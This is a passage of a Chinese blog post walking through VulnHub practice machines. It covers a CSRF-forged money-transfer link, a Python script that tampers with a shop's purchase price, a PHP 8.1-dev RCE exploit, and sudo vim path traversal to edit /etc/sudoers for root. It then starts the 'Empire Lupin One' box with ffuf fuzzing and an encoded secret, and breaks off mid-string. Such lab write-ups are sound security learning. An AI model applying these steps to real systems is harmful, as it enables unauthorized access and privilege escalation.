（半社工工具，在社交平台搜索用户名），没搜出来，教程写的也有问题，扫出来有个<code>deception-base</code>，但是正确的用户叫<code>decepticon-base</code>，多了个c，咱也不知道人家咋整出来正确的，反正人家这样写的，我找不到</p></li><li><p>我们访问这个基地<code>https://github.com/decepticon-base/Projects</code>，发现内容被删了<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924123213003.png" alt="image-20230924123213003"></p></li><li><p>用<a href="http://archive.org/web/web.php">Wayback Machine</a>查看历史版本，只能说真牛逼<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924124522092.png" alt="image-20230924124522092"></p></li><li><p>写一份脚本跑一跑，发现之前幼稚了，既要iacon，又要首都，就很难受<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924131119001.png" alt="image-20230924131119001"></p></li><li><p>ok,访问一下</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Congrats On Getting Through <span class="hljs-keyword">the</span> First Stage!<br>Your Courage allowed us <span class="hljs-keyword">to</span> obtain <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> keys!<br>Here <span class="hljs-keyword">is</span> your <span class="hljs-keyword">first</span> Flag: Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>Bad News though :/ Megatron has <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> keys <span class="hljs-keyword">at</span> his disposal. Prime <span class="hljs-keyword">and</span> Bumblebee got information <span class="hljs-keyword">from</span> Starscream, a traitor <span class="hljs-keyword">and</span> ex-commander <span class="hljs-keyword">for</span> Megatron <span class="hljs-keyword">about</span> secret <span class="hljs-built_in">item</span> he has hidden inside most expensive thing <span class="hljs-keyword">in</span> knockout&#x27;s shop. That <span class="hljs-built_in">item</span> has admin credentials.<br>Link <span class="hljs-keyword">to</span> shop: /W4RSHIP_Sh0P.php<br>Good Luck!<br><br>恭喜您通过第一阶段！<br>您的勇气让我们获得了 <span class="hljs-number">4</span> 把钥匙中的 <span class="hljs-number">2</span> 把！<br>这是您的第一个标志：Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>坏消息：/威震天有 <span class="hljs-number">2</span> 把钥匙供他使用。Prime和大黄蜂从Starscream那里得到了信息，Starscream是威震天的叛徒和前指挥官，关于他藏在Knockout商店中最昂贵的东西里的秘密物品。该项目具有管理员凭据。<br>商店链接： /W4RSHIP_Sh0P.php<br>祝你好运！<br></code></pre></td></tr></table></figure></li><li><p>接着进入商店页面，经过观察可能存在csrf漏洞，有个转账功能，转账的发起人和接收人都是以参数的形式传递的，我们可以构造一段让网站管理员给我转账一万元的链接，发给管理员(网站”刚好”有一个发送邮件的功能而且管理员”刚好”会点击这个邮件)，于是我们可以购买后两个key</p></li><li><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924195118235.png" alt="image-20230924195118235"></p></li><li><p>网站管理员叫admin_boss（源码里翻到的）<br><a href="http://192.168.48.145/W4RSHIP_Sh0P_transfer.php?to=cxkcxk&amount=100000&from=lord_starscream">http://192.168.48.145/W4RSHIP_Sh0P_transfer.php?to=cxkcxk&amp;amount=100000&amp;from=lord_starscream</a> </p></li><li><p>很好，现在我们有钱了，直接买买买！唉？买不了！！！   查看源码  <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925084336824.png" alt="image-20230925084336824"></p></li><li><p>好好好，注释我变量是吧，上脚本！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://192.168.48.145/W4RSHIP_Sh0P_buy.php&quot;</span><br>data=&#123; <span class="hljs-string">&quot;itemid&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">9999</span>&#125;<br>header=&#123;<br>    <span class="hljs-string">&#x27;cookie&#x27;</span>:<span class="hljs-string">&#x27;PHPSESSID=m20ttg2fihm10hbonpgv1v41rt&#x27;</span><br>&#125;<br><br>res = requests.post(url=url, data=data, headers=header)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure></li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925090251749.png" alt="image-20230925090251749"></p><p>14.<br>    <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Purchase Successful!Megatron <span class="hljs-keyword">Login</span> Panel URL: /M3G4TR0N_SUPR3M3/<span class="hljs-keyword">login</span>.php Username = L0RD_M3G4Tr0N <span class="hljs-keyword">Password</span> = freakishlylongpasswordforl0gin<br></code></pre></td></tr></table></figure></p><ol start="15"><li><p>登陆成功，拿到第二个flag<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925090611785.png" alt="image-20230925090611785"></p></li><li><p>检查发现版本为php8.1dev，searchsploit一下，好啊，我最喜欢RCE了😋<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925091056326.png" alt="image-20230925091056326"><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925091539296.png" alt="image-20230925091539296"></p></li><li><p>tnnd，这个脚本的命令行真傻呗，经过我不懈的摸索(看攻略)，终于学会了ssh提权并成功在<code>/home/soundwave/.ssh/pem/</code>下找到了私钥并成功登入<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925094844657.png" alt="image-20230925094844657"></p></li><li><p>下一步，提权，这里我试试新工具，看起来非常的全面啊，我们整理下可能有用的信息</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/home/m</span>egatr0n/.sudo_as_admin_successful<br><br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/etc/</span>pam.d/passwd<br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/etc/</span>passwd<br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/bash-completion/</span>completions/passwd<br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/lintian/</span>overrides/passwd<br><br>User soundwave may run the following commands on warship:<br>    (root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vim /</span>var<span class="hljs-regexp">/Decepticon/</span>*<br></code></pre></td></tr></table></figure></li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925103945221.png" alt="image-20230925103945221"></p><ol start="19"><li><p>我们先看了.&#x2F;sudo_as_admin_success 空，接着联系可执行命令和history，得知作者修改了我们的sudo权限，用的方法就是sudo vim，所以我们用 <code>sudo /usr/bin/vim</code>来修改文件，同时利用我们可修改的目录<code>/var/Deception/*</code> 来实现目录穿越，最终命令</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vim /</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/Deception/</span>..<span class="hljs-regexp">/../</span>etc/sudoers<br></code></pre></td></tr></table></figure><p>将里面soundwave用户的可执行命令改为 NOPASSWD:ALL ,即可无密码执行root权限，拿到最后一个flag。</p></li><li><p>这里我傻呗了，改成了(ALL:ALL) ALL, 直接给作者的洞修了，纯NT行为。</p></li></ol><h3 id="01-Empire-Lupin-One"><a href="#01-Empire-Lupin-One" class="headerlink" title="01 - Empire Lupin One"></a>01 - Empire Lupin One</h3><p>​    </p><ol><li><p>扫ip，端口发现 22 80</p></li><li><p>扫目录，找到个robots.txt，里面有个提示&#x2F;~myfile  ，直接访问此目录无可用信息</p></li><li><p>利用fuzz工具扫描指定格式的文件</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">fuff -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>big.txt -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.131</span>/~FUZZ<br></code></pre></td></tr></table></figure><ol start="4"><li>发现存在~secret目录，再次扫描<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007102724324.png" alt="image-20231007102724324"></li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007102804791.png"></p><ol start="5"><li><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007105502775.png" alt="image-20231007105502775"></li></ol><p>看起来要用ssh私钥登录，我们接着扫</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.131</span><span class="hljs-regexp">/~secret/</span>.FUZZ.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007105725740.png" alt="image-20231007105725740"></p><ol start="6"><li>发现了<code>.mysecret.txt</code>文件，访问看一下</li></ol><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">cGxD<span class="hljs-number">6</span>K<span class="hljs-symbol">NZQddY6</span>iCsSuqPzUdqSx<span class="hljs-number">4</span>F<span class="hljs-number">5</span>ohDY<span class="hljs-symbol">nArU3</span>kw<span class="hljs-number">5</span>dmvTURqcaTr<span class="hljs-symbol">ncHC3</span><span class="hljs-symbol">NLKBqFM2</span>ywr<span class="hljs-symbol">NbRTW3</span>eTpUvEz<span class="hljs-number">9</span>qFuB<span class="hljs-symbol">nyhAK8</span>TWu<span class="hljs-number">9</span>cFxLoscWUrc<span class="hljs-number">4</span>rLcRafiVvxPRpP<span class="hljs-number">692</span>Bw<span class="hljs-number">5</span>bshu<span class="hljs-number">6</span>ZZpixzJWv<span class="hljs-symbol">NZhPEoQoJRx7</span>jU<span class="hljs-symbol">nupsEhcCgjuXD7</span>B<span class="hljs-symbol">N1</span>TMZGL<span class="hljs-number">2</span><span class="hljs-symbol">nUxcDQwahUC1</span>u<span class="hljs-number">6</span><span class="hljs-symbol">NLSK81</span>Yh<span class="hljs-number">9</span>Lk<span class="hljs-symbol">ND67</span>WD<span class="hljs-number">87</span>Ud<span class="hljs-number">2</span>JpdUwjMossSeHEbvYjCEYB<span class="hljs-symbol">nKRPpDhSgL7</span>jmTzxmtZxS<span class="hljs-number">9</span>wX<span class="hljs-number">6</span>D<span class="hljs-symbol">NLmQBsNT936</span>L<span class="hljs-number">6</span>VwYdEPKuLeY<span class="hljs-number">6</span>wuyYmffQYZEVXhDtK<span class="hljs-number">6</span>pokmA<span class="hljs-number">3</span>J<span class="hljs-meta">o2</span>Q<span class="hljs-number">83</span>cVok<span class="hljs-number">6</span>x<span class="hljs-number">74</span><span class="hljs-name">M5</span>DA<span class="hljs-number">1</span>TdjKvEsVGLvRMkkDpshztiGCaDu<span class="hljs-number">4</span>uceLw<span class="hljs-number">3</span>iLYv<span class="hljs-symbol">NVZK75</span>k<span class="hljs-number">9</span>zK<span class="hljs-number">9</span>E<span class="hljs-number">2</span>qcdwP<span class="hljs-number">7</span>yWugahC<span class="hljs-symbol">n5</span>HyoaooLeBDiCAojj<span class="hljs-number">4</span>JUxafQUcmfocvugz<span class="hljs-symbol">n81</span>GAJ<span class="hljs-number">8</span>LdxQjosS<span class="hljs-number">1</span>tHmriYtwp<span class="hljs-number">8</span>pGf<span class="hljs-number">4</span><span class="hljs-symbol">Nfq5</span>FjqmGAdvA<span class="hljs-number">2</span>ZPMUAVWVHgkeSVE<span class="hljs-symbol">nooKT8</span>sxGUfZxg<span class="hljs-symbol">nHAfER49</span><span class="hljs-symbol">nZnz1</span>YgcFkR<span class="hljs-number">73</span>rWfP<span class="hljs-number">5</span><span class="hljs-symbol">NwEpsCgeCWYSYh3</span>XeF<span class="hljs-number">3</span>dUqBBpf<span class="hljs-number">6</span>xMJ<span class="hljs-symbol">nS7</span>wmZa<span class="hljs-number">9</span>oWZVd<span class="hljs-number">8</span>Rxs<span class="hljs-number">1</span>zrXawVKSLxardUEfRLh<span class="hljs-number">6</span>us<span class="hljs-symbol">nUmMMAnSmTyuvMTnjK2</span>vzTBbd<span class="hljs-number">5</span>djvhJKaY<span class="hljs-number">2</span>szXFetZdWBsRFhUwReUk<span class="hljs-number">7</span>DkhmCPb<span class="hljs-number">2</span>mQ<span class="hljs-symbol">NoTSuRpnfUG8</span>CWaD<span class="hljs-number">3</span>L<span class="hljs-number">2</span>Q<span class="hljs-number">9</span>UHepvrs<span class="hljs-number">67</span>YGZJWwk<span class="hljs-number">54</span>rmT<span class="hljs-number">6</span>v<span class="hljs-number">1</span>pHHLDR<span class="hljs-number">8</span>gBC<span class="hljs-number">9</span>ZTfdDtzBaZ<span class="hljs-meta">o8</span>sesPQVbuKA<span class="hljs-number">9</span>VE<span class="hljs-attr">Vsgw1</span>xVvRyRZz<span class="hljs-number">8</span>JH<span class="hljs-number">6</span>DEzqrE<span class="hljs-symbol">neoibQUdJxLVNTMXpYXGi68</span>RA<span class="hljs-number">4</span>V<span class="hljs-number">1</span>pa<span class="hljs-number">5</span>yaj<span class="hljs-number">2</span>UQ<span class="hljs-number">6</span>xRpF<span class="hljs-number">6</span>otrWTerjwAL<span class="hljs-symbol">N67</span>preSWWH<span class="hljs-number">4</span>vY<span class="hljs-number">3</span>MBv<span class="hljs-number">9</span>Cu<span class="hljs-number">6358</span>KWe<span class="hljs-attr">VC1</span>YZAXvBRwoZPXtquY<span class="hljs-number">9</span>EiFL<span class="hljs-number">6</span>i<span class="hljs-number">3</span>KXFe<span class="hljs-number">3</span>Y<span class="hljs-number">7</span>W<span class="hljs-number">4</span>Li<span class="hljs-number">7</span>jF<span class="hljs-number">8</span>vFrK<span class="hljs-number">6</span>woYGy<span class="hljs-number">8</span>soJJYEbXQp<span class="hljs-number">2</span><span class="hljs-symbol">NWqaJNcCQX8</span>umkiGf<span class="hljs-symbol">NFNiRoTfQmz29</span>wBZFJPtPJ<span class="hljs-number">98</span>UkQwKJfSW<span class="hljs-number">9</span>XKvDJwduMRWey<span class="hljs-number">2</span>j<span class="hljs-number">61</span>yaH<span class="hljs-number">4</span>ij<span class="hljs-number">5</span>uZQXDs<span class="hljs-number">37</span>F<span class="hljs-symbol">NV7</span>TBj<span class="hljs-number">71</span>GGFGEh<span class="hljs-number">8</span><span class="hljs-attr">vSKP2</span>g<span class="hljs-name">g5</span><span class="hljs-symbol">nLcACbkzF4</span>zjqdikP<span class="hljs-number">3</span>TF<span class="hljs-symbol">NWGnij5</span>az<span class="hljs-number">3</span>Axve<span class="hljs-symbol">N3</span>EUF<span class="hljs-symbol">nuDtfB4</span>ADRt<span class="hljs-number">57</span>UokLMDi<span class="hljs-number">1</span>V<span class="hljs-number">73</span>Pt<span class="hljs-number">5</span>PQe<span class="hljs-number">8</span><span class="hljs-name">g8</span>SLjuvt<span class="hljs-symbol">NYpo8</span>AqyC<span class="hljs-number">3</span>zTMSmP<span class="hljs-number">8</span>dFQgoborCXEMJz<span class="hljs-number">6</span><span class="hljs-symbol">npX6</span>QhgXqpbhS<span class="hljs-number">58</span>yVRhpW<span class="hljs-number">21</span><span class="hljs-symbol">Nz4</span>xFkDL<span class="hljs-number">8</span>QFCVH<span class="hljs-number">2</span>beL<span class="hljs-number">1</span>PZxEghmdVdY<span class="hljs-number">9</span><span class="hljs-symbol">N3</span>pVrMBUS<span class="hljs-number">7</span>Mz<span class="hljs-symbol">nYasCruXqWVE55</span>RPuSPrMEcRLoCa<span class="hljs-number">1</span>XbYt<span class="hljs-name">G5</span>JxqfbE<span class="hljs-name">g2</span>aw<span class="hljs-number">8</span>BdMirLLWhuxb<span class="hljs-name">m3</span>hxrr<span class="hljs-number">9</span>ZizxDDyu<span class="hljs-number">3</span>i<span class="hljs-number">1</span>PLkpHgQw<span class="hljs-number">3</span>zH<span class="hljs-number">4</span>GTK<span class="hljs-number">2</span>mb<span class="hljs-number">5</span>fxuu<span class="hljs-number">9</span>W<span class="hljs-number">6</span><span class="hljs-symbol">nGWW24</span>wjGbxHW<span class="hljs-number">6</span>aT<span class="hljs-symbol">neLweh74</span>jFWKzfSLgEVyc<span class="hljs-number">7</span>RyAS<span class="hljs-number">7</span>Qkwkud<span class="hljs-number">9</span>ozyBxxsV<span class="hljs-number">4</span>VEdf<span class="hljs-number">8</span>mW<span class="hljs-number">5</span><span class="hljs-name">g3</span><span class="hljs-symbol">nTDyKE69</span>P<span class="hljs-number">34</span>SkpQgDV<span class="hljs-symbol">NKJvDfJvZbL8</span><span class="hljs-meta">o6</span>BfPjEPi<span class="hljs-number">125</span>edV<span class="hljs-number">9</span>JbCy<span class="hljs-symbol">NRFKKpTxpq7</span>QSruk<span class="hljs-number">7</span>L<span class="hljs-number">5</span>LEX<span class="hljs-name">G8</span>H<span class="hljs-number">4</span>rsLyv<span class="hljs-number">6</span>djUT<span class="hljs-number">9</span><span class="hljs-symbol">nJGWQKRPi3</span>Bugawd<span class="hljs-number">7</span>ixMUYoRMhagBmGY<span class="hljs-symbol">Nafi4</span>JBapacTMw<span class="hljs-name">G95</span>wPyZT<span class="hljs-number">8</span>Mz<span class="hljs-number">6</span>gALq<span class="hljs-number">5</span>Vmr<span class="hljs-number">8</span>tkk<span class="hljs-number">9</span>ry<span class="hljs-number">4</span>Ph<span class="hljs-number">4</span>U<span class="hljs-number">2</span>Erihv<span class="hljs-symbol">NiFQVS7</span>U<span class="hljs-number">9</span>XBwQHc<span class="hljs-number">6</span>fhrDHz<span class="hljs-number">2</span>objdeDGvuVHzPgqMeRMZtjzaLBZ<span class="hljs-number">2</span>wDLeJUKEjaJAH<span class="hljs-symbol">nFLxs1</span>xWXU<span class="hljs-number">7</span>V<span class="hljs-number">4</span>gigRAtiMFB<span class="hljs-number">5</span>bjFTc<span class="hljs-number">7</span>owzKHcqP<span class="hljs-number">8</span><span class="hljs-symbol">nJrXou8</span>VJqFQDMD<span class="hljs-number">3</span>PJcLjdErZGUS<span class="hljs-number">7</span>oauaa<span class="hljs-number">3</span>xhyx<span class="hljs-number">8</span>Ar<span class="hljs-number">3</span>Aygg<span class="hljs-symbol">nywjjwZ8</span>uoWQbmx<span class="hljs-number">8</span>Sx<span class="hljs-number">71</span>x<span class="hljs-number">4</span><span class="hljs-symbol">NyhHZUzHpi8</span>vkEkbKKk<span class="hljs-number">1</span>rVL<span class="hljs-symbol">NBWHHi75</span>HixzAt<span class="hljs-symbol">NTX6</span>p<span class="hljs-symbol">nEJC3</span>t<span class="hljs-number">7</span>EPkbouDC<span class="hljs-number">2</span>eQd<span class="hljs-number">9</span>i<span class="hljs-number">6</span>K<span class="hljs-number">3</span>C<span class="hljs-symbol">npZHY3</span>mL<span class="hljs-number">7</span>zc<span class="hljs-name">g2</span>PHesRSj<span class="hljs-number">6</span>e<span class="hljs-number">7</span>oZBo<span class="hljs-name">M2</span>pSVTwtXRFBPTyFmUavtitoA<span class="hljs-number">8</span>kFZb<span class="hljs-number">4</span>DhYMcx<span class="hljs-symbol">NyLf7</span>r<span class="hljs-number">8</span>H<span class="hljs-number">98</span>WbtCshaEBaY<span class="hljs-number">7</span>b<span class="hljs-number">5</span>C<span class="hljs-symbol">ntvgFFEucFanfbz6</span>w<span class="hljs-number">8</span>cDyXJ<span class="hljs-symbol">nkzeW1</span>fz<span class="hljs-number">19</span><span class="hljs-symbol">Ni9</span>i<span class="hljs-number">6</span>h<span class="hljs-number">4</span>Bg<span class="hljs-meta">o6</span>BR<span class="hljs-number">8</span>Fkd<span class="hljs-number">5</span>dheH<span class="hljs-number">5</span>TGz<span class="hljs-number">47</span>VFH<span class="hljs-number">6</span>hmY<span class="hljs-number">3</span>aUgUvP<span class="hljs-number">8</span>Ai<span class="hljs-number">2</span>F<span class="hljs-number">2</span>jKFK<span class="hljs-name">g4</span>i<span class="hljs-number">3</span>HfCJHG<span class="hljs-name">g1</span>CXktuqz<span class="hljs-symbol">nVucjWmdZmuACA2</span>gce<span class="hljs-number">2</span>rpiBT<span class="hljs-number">6</span>GxmMrfSxDCiY<span class="hljs-number">32</span>axw<span class="hljs-number">2</span>QP<span class="hljs-number">7</span><span class="hljs-symbol">nzEBvCJi58</span>rVe<span class="hljs-number">8</span>JtdESt<span class="hljs-number">2</span>zHGsUga<span class="hljs-number">2</span>iySmusfpWqjY<span class="hljs-name">m8</span>kfmqTbY<span class="hljs-number">4</span>qAK<span class="hljs-number">13</span>v<span class="hljs-symbol">NMR95</span>QhXV<span class="hljs-number">9</span>VYp<span class="hljs-number">9</span>qff<span class="hljs-name">G5</span>YWY<span class="hljs-number">163</span>WJV<span class="hljs-number">5</span>urYK<span class="hljs-name">M6</span>BBiuK<span class="hljs-number">9</span>QkswCzgPtjsfFBBU<span class="hljs-meta">o6</span>vft<span class="hljs-symbol">NqCNbzQn4</span><span class="hljs-symbol">NMQmxm28</span>hDMDU<span class="hljs-number">8</span>GydwU<span class="hljs-name">m19</span>oj<span class="hljs-symbol">No1</span>scUMzGf<span class="hljs-symbol">N4</span>rLx<span class="hljs-number">7</span>bs<span class="hljs-number">3</span>S<span class="hljs-number">9</span>wYaVLDLi<span class="hljs-symbol">NeZdLLU1</span>DaKQhZ<span class="hljs-number">5</span>cFZ<span class="hljs-number">7</span>iymJHXuZFFgpbYZYFigLa<span class="hljs-number">7</span>SokXis<span class="hljs-number">1</span>LYfbHeXM<span class="hljs-attr">vcfeuApmAaGQk6</span>xmajEbpcb<span class="hljs-symbol">n1</span>H<span class="hljs-number">5</span>QQiQpYMX<span class="hljs-number">3</span>BRp<span class="hljs-number">41</span>w<span class="hljs-number">9</span>RVRuLGZ<span class="hljs-number">1</span>yLKxP<span class="hljs-number">37</span>ogcppStCvDMGfiuVMU<span class="hljs-number">5</span>SRJMajLXJBz<span class="hljs-symbol">nzRSqBYwWmf4</span>MS<span class="hljs-number">6</span>B<span class="hljs-number">57</span>xp<span class="hljs-number">56</span>jVk<span class="hljs-number">6</span>maGCsgjbuAhLyCwfG<span class="hljs-symbol">n1</span>LwLoJDQ<span class="hljs-number">1</span>kjLm<span class="hljs-symbol">nVrk7</span>FkUUESqJKjp<span class="hljs-number">5</span>cuX<span class="hljs-number">1</span>EUpFjsfU<span class="hljs-number">1</span>HaibABz<span class="hljs-number">3</span>fcYY<span class="hljs-number">2</span>cZ<span class="hljs-number">78</span>qx<span class="hljs-number">2</span>iaqS<span class="hljs-number">7</span>eP<span class="hljs-meta">o5</span>Bkwv<span class="hljs-number">5</span>XmtcLELXbQZKcHcwxkbC<span class="hljs-number">5</span>P<span class="hljs-symbol">nEP6</span>EUZRb<span class="hljs-number">3</span><span class="hljs-symbol">nqm5</span>hMDUUt<span class="hljs-number">912</span>ha<span class="hljs-number">5</span>kMR<span class="hljs-number">6</span><span class="hljs-name">g4</span>aV<span class="hljs-name">G8</span>bXFU<span class="hljs-number">6</span>a<span class="hljs-symbol">n5</span>PikaedHBRVRCygkpQj<span class="hljs-name">m8</span>Lhe<span class="hljs-number">1</span>cA<span class="hljs-number">8</span>X<span class="hljs-number">2</span>jtQiUjwveF<span class="hljs-number">5</span>bU<span class="hljs-symbol">NPmvPGk1</span>hjuP<span class="hljs-number">56</span>aWEg<span class="hljs-symbol">nyXzZkKVPbWj7</span>MQQ<span class="hljs-number">3</span>kAfqZ<span class="hljs-number">8</span>hkKD<span class="hljs-number">1</span>VgQ<span class="hljs-number">8</span>pmqayiajhFHorfgtRk<span class="hljs-number">8</span>ZpuEPpHH<span class="hljs-number">25</span>aoJf<span class="hljs-symbol">NMtY45</span>mJYjHM<span class="hljs-attr">VSVnvG9</span>e<span class="hljs-number">3</span>PHrGwrks<span class="hljs-number">1</span>eLQRXjjRmGtWu<span class="hljs-number">9</span>cwT<span class="hljs-number">2</span>bjy<span class="hljs-number">2</span>huWY<span class="hljs-number">5</span>b<span class="hljs-number">7</span>xUSAXZfmRsbkT<span class="hljs-number">3</span>eFQ<span class="hljs-symbol">nGkAHmjMZ5</span><span class="hljs-symbol">nAfmeGhshCtNjAU4</span>idu<span class="hljs-number">8</span><span class="hljs-meta">o7</span>HMmMuc<span class="hljs-number">3</span>tpK<span class="hljs-number">6</span>res<span class="hljs-number">9</span>HTC<span class="hljs-meta">o35</span>ujK<span class="hljs-number">3</span>UK<span class="hljs-number">2</span>LyMFEKjB<span class="hljs-symbol">NcXbigDWSM34</span>mXSKHA<span class="hljs-number">1</span><span class="hljs-name">M4</span>MF<span class="hljs-number">7</span>dPewvQsAkvxRTCmeWwRWz<span class="hljs-number">6</span>DKZv<span class="hljs-number">2</span>MY<span class="hljs-number">1</span>ezWd<span class="hljs-number">7</span>mLvwG<span class="hljs-meta">o9</span>ti<span class="hljs-number">9</span>SMTXrkrxHQ<span class="hljs-number">8</span>DShu<span class="hljs-symbol">NorjCzNCuxLNG9</span>ThpPgWJoFb<span class="hljs-number">1</span>sJL<span class="hljs-number">1</span>ic<span class="hljs-number">9</span>QVTvDHCJ<span class="hljs-symbol">nD1</span>AKdCjt<span class="hljs-symbol">NHrG973</span>BVZ<span class="hljs-symbol">NUF6</span>DwbFq<span class="hljs-number">5</span>d<span class="hljs-number">4</span>CTL<span class="hljs-symbol">N6</span>jxtCFs<span class="hljs-number">3</span>XmoKquzEY<span class="hljs-number">7</span>MiCzRaq<span class="hljs-number">3</span>kB<span class="hljs-symbol">NAFYNCoVxRBU3</span>d<span class="hljs-number">3</span>aXfLX<span class="hljs-number">4</span>rZXEDBfAgtumkRRmWowk<span class="hljs-symbol">Njs2</span>JDZmzS<span class="hljs-number">4</span>H<span class="hljs-number">8</span><span class="hljs-symbol">nawmMa1</span>PYmrr<span class="hljs-number">7</span>a<span class="hljs-symbol">NDPEW2</span>wdbjZurKAZhheoEYCvP<span class="hljs-number">9</span>dfqdbL<span class="hljs-number">9</span>gPrWf<span class="hljs-symbol">NBJyVBXRD8</span>EZwFZ<span class="hljs-symbol">NKb1</span>eWPh<span class="hljs-number">1</span>sYzUbPPhgruxWA<span class="hljs-symbol">NCH52</span>gQpfAT<span class="hljs-symbol">NqmtTJZFjsfpiXLQjdBxdzfz7</span>pWvK<span class="hljs-number">8</span>jivh<span class="hljs-symbol">nQaiajW3</span>pwt<span class="hljs-number">4</span>cZxwMfcrrJke<span class="hljs-number">14</span>v<span class="hljs-symbol">N8</span>Xbyqdr<span class="hljs-number">9</span>zLFjZDJ<span class="hljs-number">7</span><span class="hljs-symbol">nLdmuXTwxPwD8</span>Seoq<span class="hljs-number">2</span>hYEhR<span class="hljs-number">97</span>D<span class="hljs-symbol">nKfMY2</span>LhoWGaHoFqycPCaX<span class="hljs-number">5</span>FCP<span class="hljs-symbol">Nf9</span>CFt<span class="hljs-number">4</span><span class="hljs-symbol">n4</span><span class="hljs-symbol">nYGLau7</span>ci<span class="hljs-number">5</span>uC<span class="hljs-number">7</span>ZmssiT<span class="hljs-number">1</span>jHTjKy<span class="hljs-number">7</span>J<span class="hljs-number">9</span>a<span class="hljs-number">4</span>q<span class="hljs-number">614</span>GFDdZULTkw<span class="hljs-number">8</span>Pmh<span class="hljs-number">92</span>fuTdK<span class="hljs-number">7</span>Z<span class="hljs-number">6</span>fweY<span class="hljs-number">4</span>hZyGdUXGtPXveXwGWES<span class="hljs-number">36</span>ecCpYXPSPw<span class="hljs-number">6</span>ptVb<span class="hljs-number">9</span>RxC<span class="hljs-number">81</span>AZFPG<span class="hljs-symbol">nts85</span>PYS<span class="hljs-number">6</span>aD<span class="hljs-number">2</span>eUmge<span class="hljs-number">6</span>KGzFopMjYLma<span class="hljs-number">85</span>X<span class="hljs-number">55</span>Pu<span class="hljs-number">4</span>tCxyF<span class="hljs-number">2</span>FR<span class="hljs-number">9</span>E<span class="hljs-number">3</span>c<span class="hljs-number">2</span>zxtry<span class="hljs-name">G6</span><span class="hljs-symbol">N2</span>oVT<span class="hljs-symbol">nyZt23</span>YrEhEe<span class="hljs-number">9</span>kcCX<span 